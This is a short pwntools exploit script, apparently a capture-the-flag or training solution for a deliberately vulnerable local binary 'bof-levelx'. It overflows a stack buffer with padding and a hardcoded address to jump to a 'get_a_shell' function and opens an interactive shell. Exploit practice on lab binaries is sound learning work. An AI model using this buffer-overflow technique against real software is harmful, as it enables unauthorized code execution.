#!/usr/bin/env python

from pwn import *
import os

p = process("./bof-levelx")
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p)
e = ELF("./bof-levelx")

shell_addr = e.symbols["get_a_shell"]
print(hex(shell_addr))

buf = p32(shell_addr) + "A" * 0x74 + "BBBB" + p32(0xffffc4b0)

print(buf)

p.sendline(buf)

p.interactive()
